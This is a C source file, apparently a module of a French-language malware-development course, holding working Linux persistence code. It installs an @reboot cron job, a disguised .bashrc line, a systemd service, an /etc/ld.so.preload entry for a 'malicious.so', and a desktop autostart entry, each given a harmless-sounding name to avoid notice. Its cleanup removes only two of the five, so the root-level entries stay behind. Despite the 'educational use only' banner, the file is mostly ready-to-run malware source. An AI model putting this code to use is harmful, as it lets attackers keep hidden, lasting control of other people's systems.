/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development. Usage éducatif uniquement.
 *
 * Module 33 : Linux Persistence Techniques
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

// 1. Cron job persistence (@reboot)
int persist_cron_job(const char* command) {
    char cmd[512];

    // Ajouter @reboot cron job
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -",
             command);

    printf("[*] Installing cron job: %s\n", command);

    if (system(cmd) == 0) {
        printf("[+] Cron job installed successfully\n");
        return 1;
    } else {
        printf("[-] Failed to install cron job\n");
        return 0;
    }
}

// 2. .bashrc persistence
int persist_bashrc(const char* command) {
    char* home = getenv("HOME");
    if (!home) {
        printf("[-] Cannot get HOME directory\n");
        return 0;
    }

    char bashrc_path[512];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);

    FILE* f = fopen(bashrc_path, "a");
    if (!f) {
        printf("[-] Cannot open .bashrc for writing\n");
        return 0;
    }

    // Ajouter ligne discrète (après commentaire)
    fprintf(f, "\n# System maintenance task\n");
    fprintf(f, "%s &\n", command);
    fclose(f);

    printf("[+] Added persistence to %s\n", bashrc_path);
    return 1;
}

// 3. Systemd service persistence (nécessite root)
int persist_systemd_service(const char* service_name, const char* binary_path) {
    char service_file[512];
    snprintf(service_file, sizeof(service_file),
             "/etc/systemd/system/%s.service", service_name);

    // Vérifier si on peut écrire (nécessite root)
    FILE* f = fopen(service_file, "w");
    if (!f) {
        printf("[-] Cannot create systemd service (need root)\n");
        return 0;
    }

    // Écrire service file
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=System Maintenance Service\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "Type=simple\n");
    fprintf(f, "ExecStart=%s\n", binary_path);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=10\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=multi-user.target\n");
    fclose(f);

    // Activer service
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "systemctl enable %s.service", service_name);
    system(cmd);

    printf("[+] Systemd service created: %s\n", service_file);
    return 1;
}

// 4. LD_PRELOAD persistence (très furtif, nécessite root)
int persist_ld_preload(const char* so_path) {
    const char* preload_file = "/etc/ld.so.preload";

    FILE* f = fopen(preload_file, "a");
    if (!f) {
        printf("[-] Cannot open /etc/ld.so.preload (need root)\n");
        return 0;
    }

    fprintf(f, "%s\n", so_path);
    fclose(f);

    printf("[+] Added %s to /etc/ld.so.preload\n", so_path);
    printf("[!] VERY STEALTHY - loaded by all processes\n");
    return 1;
}

// 5. XDG Autostart persistence (desktop environments)
int persist_xdg_autostart(const char* app_name, const char* binary_path) {
    char* home = getenv("HOME");
    if (!home) {
        printf("[-] Cannot get HOME directory\n");
        return 0;
    }

    char autostart_dir[512];
    snprintf(autostart_dir, sizeof(autostart_dir),
             "%s/.config/autostart", home);

    // Créer répertoire si nécessaire
    mkdir(autostart_dir, 0755);

    char desktop_file[512];
    snprintf(desktop_file, sizeof(desktop_file),
             "%s/%s.desktop", autostart_dir, app_name);

    FILE* f = fopen(desktop_file, "w");
    if (!f) {
        printf("[-] Cannot create .desktop file\n");
        return 0;
    }

    fprintf(f, "[Desktop Entry]\n");
    fprintf(f, "Type=Application\n");
    fprintf(f, "Name=System Update Service\n");
    fprintf(f, "Exec=%s\n", binary_path);
    fprintf(f, "Hidden=false\n");
    fprintf(f, "NoDisplay=false\n");
    fprintf(f, "X-GNOME-Autostart-enabled=true\n");
    fclose(f);

    chmod(desktop_file, 0644);

    printf("[+] XDG autostart created: %s\n", desktop_file);
    return 1;
}

// Cleanup functions
void cleanup_cron_job(const char* command) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "crontab -l 2>/dev/null | grep -v '%s' | crontab -",
             command);
    system(cmd);
    printf("[*] Removed cron job\n");
}

void cleanup_bashrc(const char* command) {
    char* home = getenv("HOME");
    if (!home) return;

    char bashrc_path[512];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);

    // Utiliser sed pour supprimer ligne
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "sed -i.bak '\\|%s|d' %s",
             command, bashrc_path);
    system(cmd);

    printf("[*] Removed from .bashrc\n");
}

int main() {
    printf("\n⚠️  AVERTISSEMENT : Techniques de persistence Linux malware dev\n");
    printf("   Usage éducatif uniquement. Tests VM isolées.\n\n");

    char current_exe[512];
    ssize_t len = readlink("/proc/self/exe", current_exe, sizeof(current_exe)-1);
    if (len != -1) {
        current_exe[len] = '\0';
    } else {
        strcpy(current_exe, "/tmp/unknown");
    }

    printf("[*] Current executable: %s\n\n", current_exe);

    printf("=== LINUX PERSISTENCE TECHNIQUES DEMO ===\n\n");

    // 1. Cron job (user-level, pas besoin root)
    printf("[1] Cron Job Persistence\n");
    persist_cron_job(current_exe);

    // 2. .bashrc persistence (user-level)
    printf("\n[2] .bashrc Persistence\n");
    persist_bashrc(current_exe);

    // 3. XDG Autostart (user-level, desktop)
    printf("\n[3] XDG Autostart Persistence\n");
    persist_xdg_autostart("SysUpdate", current_exe);

    // 4. Systemd service (nécessite root)
    printf("\n[4] Systemd Service\n");
    persist_systemd_service("sys-maintenance", current_exe);

    // 5. LD_PRELOAD (nécessite root, très furtif)
    printf("\n[5] LD_PRELOAD Hijacking\n");
    persist_ld_preload("/tmp/malicious.so");

    printf("\n[*] CLEANUP (removing persistence mechanisms)\n\n");
    cleanup_cron_job(current_exe);
    cleanup_bashrc(current_exe);

    printf("\n[!] NOTES:\n");
    printf("- Cron jobs = très commun, facile détection\n");
    printf("- .bashrc = exécution au login, user-level\n");
    printf("- Systemd = exécution boot, nécessite root\n");
    printf("- LD_PRELOAD = très furtif, rootkit-level\n");
    printf("- XDG Autostart = desktop environments uniquement\n");
    printf("- Utiliser chkrootkit/rkhunter pour détecter\n");

    return 0;
}
